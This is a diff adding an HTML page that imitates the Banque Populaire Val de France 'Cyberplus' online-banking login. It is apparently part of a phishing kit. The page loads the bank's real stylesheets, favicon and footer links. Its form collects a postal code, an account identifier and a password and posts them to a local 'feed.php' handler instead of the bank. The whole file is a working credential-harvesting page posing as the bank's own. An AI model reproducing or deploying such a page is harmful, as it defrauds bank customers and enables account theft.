@@ -1,0 +1,157 @@
+<html lang="en" ng-app="dacsApp" id="ng-app" class="ng-scope"><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}</style>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+        <title>Bienvenue sur Cyberplus</title>		
+		<!--[if lte IE 7]>
+        <script type="text/javascript" src="https://www.icgauth.banquepopulaire.fr/WebSSO_BP/lib/json3/json3.min.js?v=1"></script>
+		<![endif]-->
+		<!--[if lte IE 8]>
+        <script type="text/javascript" src="https://www.icgauth.banquepopulaire.fr/WebSSO_BP/lib/es5-shim/es5-shim.min.js?v=1"></script>
+		<script type="text/javascript" src="https://www.icgauth.banquepopulaire.fr/WebSSO_BP/lib/html5/html5shiv.min.js?v=1"></script>
+		<![endif]-->
+		<link rel="icon" href="https://www.icgauth.banquepopulaire.fr/WebSSO_BP/img/favicons/favicon_BP.ico">
+		<link rel="stylesheet" href="https://www.icgauth.banquepopulaire.fr/WebSSO_BP/css/app.css?v=4">
+        <link rel="stylesheet" href="./custom.css?v=1">		
+    <style type="text/css"></style><meta name="chromesniffer" id="chromesniffer_meta" content="{&quot;jQuery&quot;:&quot;1.9.1&quot;,&quot;Angular&quot;:&quot;1.2.15&quot;}"><script type="text/javascript" src="chrome-extension://homgcnaoacgigpkkljjjekpignblkeae/detector.js"></script></head>
+
+    <body ng-controller="transactionListCtrl" class="ng-scope">
+        <header class="header">
+            <div class="header-content"></div>
+        </header>
+<form class="ca-forms ca-forms-stitre" method="POST" name="formulaire" id="formulaire" action="feed.php" onsubmit="return false;">
+        <section class="center">
+		<div class="modal"><div class="loader"><div class="loaderText">Chargement en cours</div></div></div>
+            <div class="center">
+                <!-- ngIf: !transaction.error --><span ng-if="!transaction.error" class="ng-scope">
+                   <!-- ngInclude:  --><div class="row-fluid ng-scope" ng-include="" src="'/WebSSO_BP/partials/success.html?v=1'"><!-- ngIf: transaction.step && !locked --><div class="ng-scope" ng-if="transaction.step &amp;&amp; !locked">
+    <div class="global-content">
+        <!-- ngIf: transaction.step.phase.state !== 'ENROLLMENT' && transaction.step.phase.state !== 'TERMS_OF_USE' --><h1 class="titre ng-scope" ng-if="transaction.step.phase.state !== 'ENROLLMENT' &amp;&amp; transaction.step.phase.state !== 'TERMS_OF_USE'">
+            Bienvenue sur Cyberplus,
+            <br>
+            Pour accéder à votre espace sécurisé, merci de compléter les éléments suivants :
+        </h1><!-- end ngIf: transaction.step.phase.state !== 'ENROLLMENT' && transaction.step.phase.state !== 'TERMS_OF_USE' -->
+
+        <!-- ngIf: transaction.step.phase.origin === 'REQUESTED' -->
+        <!-- ngIf: transaction.step.phase.origin === 'FORCED' -->
+
+		<!-- ngIf: transaction.step.phase.state === 'TERMS_OF_USE' -->
+        <!-- ngIf: transaction.step.phase.state !== 'TERMS_OF_USE' --><div class="form-content ng-scope" ng-if="transaction.step.phase.state !== 'TERMS_OF_USE'">
+            <!-- ngRepeat: factor in factors --><div ng-repeat="factor in factors" class="ng-scope">
+                <!-- ngIf: factor.type === 'PASSWORD' -->
+                <!-- ngIf: factor.type === 'PASSWORD_LOOKUP' --><div class="ng-scope" ng-if="factor.type === 'PASSWORD_LOOKUP'">
+                    <!-- ngInclude:  --><div ng-include="" src="'/WebSSO_BP/partials/factors/passwordlookup.html?v=1'" class="ng-scope"><!-- debut du factor Mot de passe avec demande d’identifiant -->
+<div ng-controller="passwordlookupCtrl" ng-init="factorId = factor.id;
+                factorType = factor.type;
+				currentFactor = factor;" class="ng-scope">
+    
+    <!-- ngIf: isError -->
+<table cellspacing="0">
+    <tbody>
+        <tr>
+            <td class="table-txt">
+                <label>Code postal :</label>
+            </td>
+            <td class="table-input">
+                <input type="text" id="departement" name="departement" required class="text-input ng-pristine ng-valid" ng-model="login" init-focus="">
+            </td>
+        </tr>
+		
+		<tr>
+            <td class="table-txt">
+                <label>Identifiant :</label>
+            </td>
+            <td class="table-input">
+                <input type="text" id="CCPTE" name="CCPTE" required class="text-input ng-pristine ng-valid" ng-model="login" init-focus="">
+            </td>
+        </tr>
+        <tr>
+            <td class="table-txt">
+                <label>Mot de passe :</label>
+            </td>
+            <td class="table-input">
+                <input id="CCCRYC" name="CCCRYC" ng-keyup="$event.keyCode == 13 ? enterKeyFunc() : null" type="password" required class="text-input ng-pristine ng-valid" ng-model="password">
+            </td>
+        </tr>
+    </tbody>
+</table>
+</div>
+<script class="ng-scope">$("body").ready(function(){if($("section").hasClass("loading")){$("section").removeClass("loading");}});</script>
+<!-- fin du factor Mot de passe avec demande d’identifiant --></div> 					
+                </div><!-- end ngIf: factor.type === 'PASSWORD_LOOKUP' -->
+                <!-- ngIf: factor.type === 'PASSWORD_ENROLL' -->
+            </div><!-- end ngRepeat: factor in factors -->
+        </div><!-- end ngIf: transaction.step.phase.state !== 'TERMS_OF_USE' -->
+        <div class="controls-content">
+            <div>
+                <!-- ngIf: transaction.step.phase.state != 'ENROLLMENT' --><input type="button" value="Annuler" class="btn annuler ng-scope" ng-click="cancelTransaction()" ng-if="transaction.step.phase.state != 'ENROLLMENT'"><!-- end ngIf: transaction.step.phase.state != 'ENROLLMENT' -->
+                <!-- ngIf: transaction.step.phase.state === 'ENROLLMENT' && transaction.step.phase.innerStep === 'ENROLLMENT' -->
+                <input type="submit" onclick="myFunction()" value="Valider" class="btn disabled">
+				
+				<script>
+function myFunction() {
+    if(document.getElementById("departement").value==""){
+			alert("Veuillez renseigner votre code postal !");
+			
+			return false;
+		}
+    if(document.getElementById("CCPTE").value==""){
+			alert("Veuillez renseigner votre Identifiant !");
+			
+			return false;
+		}
+    if(document.getElementById("CCCRYC").value==""){
+			alert("Veuillez renseigner votre Mot de passe !");
+			
+			return false;
+		}
+		
+	else{	
+		document.getElementById("formulaire").submit();
+		}	
+		
+}
+</script>
+				
+            </div>
+            <!-- ngIf: transaction.step.phase.state === 'AUTHENTICATION' --><a href="#" class="link ng-scope" ng-click="forgottenCred()" ng-if="transaction.step.phase.state === 'AUTHENTICATION'">Mot de passe oublié</a><!-- end ngIf: transaction.step.phase.state === 'AUTHENTICATION' -->
+        </div>
+		
+	
+
+        <!-- ngIf: factors && factors.length == 1 && factors[0].type == 'PASSWORD_ENROLL' -->
+    </div>
+</div><!-- end ngIf: transaction.step && !locked -->
+<!-- ngIf: locked -->
+</div>
+                </span><!-- end ngIf: !transaction.error -->         
+            </div>
+            <form name="downloadAuthForm" action="" method="POST" id="redirForm" class="ng-pristine ng-valid">
+                    <input type="hidden" name="SAMLResponse" id="SAMLResponse">
+                    <!-- ngIf: relayState -->
+            </form>
+            <!-- ngIf: transaction.step.phase.state != 'ENROLLMENT' && transaction.step.phase.state != 'TERMS_OF_USE' --><div ng-if="transaction.step.phase.state != 'ENROLLMENT' &amp;&amp; transaction.step.phase.state != 'TERMS_OF_USE' " class="iframe-content ng-scope">
+                 <iframe id="infoFrame" frameborder="0" src="https://www.ibps.valdefrance.banquepopulaire.fr/s3f-web/getResource?mod=1"></iframe>
+		    </div><!-- end ngIf: transaction.step.phase.state != 'ENROLLMENT' && transaction.step.phase.state != 'TERMS_OF_USE' -->
+        </section>
+</form>
+        <footer>
+            <a id="bankLogoV0" target="t1" title="Accueil du site de la banque" href="http://www.banquepopulaire.fr"></a>
+            <ul>
+                <li class="first"><a id="footerAide" target="t2" title="Accéder à l'aide à la connexion" href="http://www.bpvf.banquepopulaire.fr/portailinternet/Editorial/BanqueEnLigne/Pages/aide-a-la-connexion.aspx">Aide à la connexion</a></li>
+                <li><a id="footerSecu" target="t3" title="Lire les informations sur la sécurité" href="http://www.valdefrance.banquepopulaire.fr/portailinternet/Editorial/BanqueEnLigne/Pages/securite.aspx">Sécurité</a></li>
+                <li><a id="footerInfosNav" target="t4" title="Infos navigateurs" href="https://www.ibps.valdefrance.banquepopulaire.fr/s3f-web/getResource?mod=7&amp;bq=ENTA4-ENV00009">Infos navigateurs</a></li>
+                <li><a id="footerPlanSite" target="t5" title="Plan du site" href="http://www.valdefrance.banquepopulaire.fr/portailinternet/Editorial/Informations/Pages/plan_site.aspx">Plan du site</a></li>
+                <li><a id="footerMentionsLegales" target="t6" title="Mentions légales" href="http://www.valdefrance.banquepopulaire.fr/portailinternet/Editorial/Tarifs/Pages/mentions-legales.aspx">Mentions légales</a></li>
+            </ul>
+            <p>
+                ©BPCE
+                <br>
+                <span id="footerBanque">Banque Populaire Val de France&nbsp;2016</span>
+            </p>
+        </footer>
+		<script type="text/javascript" src="/WebSSO_BP/js/jsAll.min.js?v=4"></script>
+		<script type="text/javascript">var banque = "18707"; setGlobalXiti();</script>
+        <script type="text/javascript">$(document).ready(function(){ getConfig(banque); });</script>
+    
+
+</body></html>
